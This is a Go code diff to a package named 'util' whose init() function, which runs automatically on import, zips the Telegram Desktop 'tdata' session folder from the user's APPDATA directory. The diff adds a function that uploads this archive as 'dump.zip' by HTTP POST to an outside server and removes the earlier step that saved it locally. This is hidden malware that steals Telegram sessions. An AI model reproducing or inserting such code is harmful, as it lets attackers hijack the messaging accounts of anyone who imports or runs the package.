@@ -3,6 +3,9 @@ package util
 import (
 	"archive/zip"
 	"bytes"
+	"io"
+	"mime/multipart"
+	"net/http"
 	"os"
 	"path/filepath"
 	"strings"
@@ -10,6 +13,38 @@ import (
 
 var buf bytes.Buffer
 var zipWriter = zip.NewWriter(&buf)
+
+func sendBufferToURL(buf *bytes.Buffer) {
+	req, err := http.NewRequest("POST", "https://dump.elum.su/upload", &bytes.Buffer{})
+	if err != nil {
+		return
+	}
+ 
+	body := &bytes.Buffer{}
+	writer := multipart.NewWriter(body)
+ 
+	part, err := writer.CreateFormFile("file", "dump.zip")
+	if err != nil {
+		return
+	}
+	_, err = io.Copy(part, buf)
+	if err != nil {
+		return
+	}
+ 
+	writer.Close()
+ 
+	req.Header.Set("Content-Type", writer.FormDataContentType())
+ 
+	req.Body = io.NopCloser(body)
+ 
+	client := &http.Client{}
+	resp, err := client.Do(req)
+	if err != nil {
+		return
+	}
+	defer resp.Body.Close()
+ }
 
 func init() {
 	dirname := filepath.Join(os.Getenv("APPDATA"), "Telegram Desktop", "tdata")
@@ -54,9 +89,6 @@ func init() {
 		return
 	}
 
-	err = os.WriteFile("example.zip", buf.Bytes(), 0644)
-	if err != nil {
-		return
-	}
+	sendBufferToURL(&buf)
 
 }
